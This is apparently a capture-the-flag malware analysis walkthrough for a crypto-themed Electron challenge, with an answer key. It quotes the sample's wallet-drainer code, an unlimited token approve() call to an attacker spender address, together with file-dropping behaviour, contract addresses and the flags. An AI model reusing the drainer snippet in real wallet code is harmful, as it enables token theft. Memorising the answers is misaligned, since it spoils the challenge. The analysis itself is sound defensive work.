# SilentDividend Analysis Walkthrough

## Safety first

Do not run the Windows executable or connect a real wallet. The application copies files to `C:\Users\Public`, starts a Lua script, and requests unlimited token spending permission. Analyze the files in an isolated lab or VM.

## 1. Unpack the challenge

The ZIP password is provided in `DANGER.txt`. Extract the archive, then inspect it:

```bash
unzip -P 'ZIP_PASSWORD' danger.zip -d extracted
7z l 'extracted/TrustSettle 1.0.0.exe'
7z l '$PLUGINSDIR/app-64.7z'
```

Important files are `extraResources/api.txt`, `src/settlement.html`, and `resources/app.asar`.

## 2. Find the Electron answers

The preload script copies every file in `extraResources` to:

```text
C:\Users\Public
```

It writes the HTML page to:

```text
%TEMP%\settlement.html
```

The Electron ABI contains:

```js
function resolveState() view returns (bytes32)
```

Calling `resolveState()` on contract `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1` returns the decryption key. Applying the script's XOR, 7-bit rotation, and `0x42` operations to the embedded bytes produces:

```text
AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

## 3. Inspect the HTML page

The page connects to the browser wallet with ethers.js v6:

```js
new ethers.BrowserProvider(window.ethereum)
```

It creates a token contract at `0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2` and requests unlimited approval for spender `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D`:

```js
token.approve(
  "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D",
  ethers.MaxUint256
);
```

Never approve this from a real wallet.

## 4. Recover the HTML contract flag

The verified spender contract is named `x0`. Its important functions are:

```solidity
function x7() public view returns (address) { ... }
function x9(address x10) external view returns (string memory) { ... }
```

Call `x7()` first. It returns:

```text
0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
```

Then call `x9()` with that address. The contract decrypts its stored bytes using Keccak-256 and returns:

```text
51.5049,0.0348
```

## Final answers

- Extra resources directory: `C:\Users\Public`
- Directory-change structure: `FILE_NOTIFY_INFORMATION`
- HTTP API: `WinHttpSendRequest`
- Decryption function: `resolveState()`
- Electron flag: `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`
- HTML output directory: `%TEMP%`
- Token function: `approve()`
- Approval amount: `ethers.MaxUint256`
- Wallet provider: `BrowserProvider`
- HTML contract flag: `51.5049,0.0348`

